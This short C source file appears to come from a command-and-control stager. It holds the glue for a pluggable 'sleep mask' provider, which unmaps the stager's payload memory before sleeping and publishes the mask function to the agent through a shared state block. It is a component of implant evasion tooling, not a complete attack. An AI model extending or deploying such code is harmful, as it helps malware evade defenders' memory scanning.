/* mask.c — the sleep-mask provider contract glue.
 *
 * A provider is selected at build time with MASK=<name> and implements
 * stager_mask_sleep() in mask_<name>.c. The stub publishes that entry point in
 * the same-process GS state block the agent reads; adding a provider requires
 * no change to the stub or agent.
 */

#include "mask.h"

#include "state.h"
#include "util/utils.h"

int stager_mask_sleep(unsigned seconds, uintptr_t probe) {
  struct stager_state *st = get_stager_state();
  if (st->payload != NULL && st->payload_size > 0) {
    munmap(st->payload, PAGE_ALIGN_UP(st->payload_size));
    st->payload = NULL;
    st->payload_size = 0;
  }
  return stager_mask_provider_sleep(seconds, probe);
}

void stager_mask_publish(void) {
  struct stager_state *st = get_stager_state();
  st->pub.abi_magic = C2_STAGER_ABI_MAGIC;
  st->pub.abi_version = C2_STAGER_ABI_VERSION;
  st->pub.mask_fn = stager_mask_sleep;
}
